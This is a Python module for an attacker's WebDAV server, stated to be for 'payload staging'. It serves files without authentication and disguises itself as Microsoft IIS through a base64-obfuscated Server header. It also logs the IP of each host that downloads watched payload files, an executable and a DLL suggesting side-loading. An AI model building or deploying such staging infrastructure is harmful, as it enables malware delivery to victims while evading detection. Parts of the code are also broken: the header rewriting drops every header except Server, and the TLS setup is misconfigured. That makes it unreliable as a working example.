# webdav_server.py
# Module for launching a lightweight WebDAV server for payload staging.

import os
import base64
import ssl
import time
from cheroot import wsgi
from wsgidav.wsgidav_app import WsgiDAVApp

class HeaderSpoofMiddleware:
    def __init__(self, app, server_tag_b64="TWljcm9zb2Z0LUlJUy8xMC4w"): # "Microsoft-IIS/10.0"
        self.app = app
        self.server_tag = base64.b64decode(server_tag_b64).decode('utf-8')

    def __call__(self, environ, start_response):
        def custom_start_response(status, headers, exc_info=None):
            new_headers = []
            for name, value in headers:
                if name.lower() == 'server':
                    continue # Remove original server header
            new_headers.append(('Server', self.server_tag))
            return start_response(status, new_headers, exc_info)
        return self.app(environ, custom_start_response)

class IntelMiddleware:
    def __init__(self, app, watch_list=['/reports/iediagcmd.exe', '/reports/MessageWeaver.dll']):
        self.app = app
        self.watch = watch_list

    def __call__(self, environ, start_response):
        path = environ.get('PATH_INFO', '')
        if path in self.watch:
            # Obfuscated log message
            ts = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())
            r_ip = environ.get('REMOTE_ADDR', '?.?.?.?')
            log_msg = f"[{ts} GMT] SIG_HIT: {r_ip} -> {path}"
            print(log_msg) # This will print to console/TUI log panel

        return self.app(environ, start_response)

class DAVServer:
    def __init__(self, root_path: str, host: str, port: int, use_tls: bool = False, verbose: bool = True):
        if not os.path.exists(root_path):
            print(f"[*] Server root path '{root_path}' does not exist. Creating it.")
            os.makedirs(root_path)

        self.host = host
        self.port = port
        self.config = {
            "provider_mapping": {"/": root_path},
            "verbose": 1 if verbose else 0,
            "http_authenticator": {
                "domain_controller": None,  # Authentication disabled for this use case
            },
            "dir_browser": {"enable": True},
        }
        wsgidav_app = WsgiDAVApp(self.config)
        self.app = IntelMiddleware(HeaderSpoofMiddleware(wsgidav_app))
        self.server = wsgi.Server((self.host, self.port), self.app)
        if use_tls:
            ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            # Generate self-signed cert on the fly or load from file
            # For this task, we assume a pre-generated cert.pem
            ctx.load_cert_chain('cert.pem', 'key.pem')
            self.server.ssl_adapter = ctx
        print(f"[*] WebDAV server configured to serve files from: {os.path.abspath(root_path)}")

    def start(self):
        print(f"[*] Starting WebDAV server on http://{self.host}:{self.port}...")
        try:
            self.server.start()
        except KeyboardInterrupt:
            print("\n[*] User interrupted. Stopping server.")
            self.server.stop()
        except Exception as e:
            print(f"[!] Server failed to start: {e}")
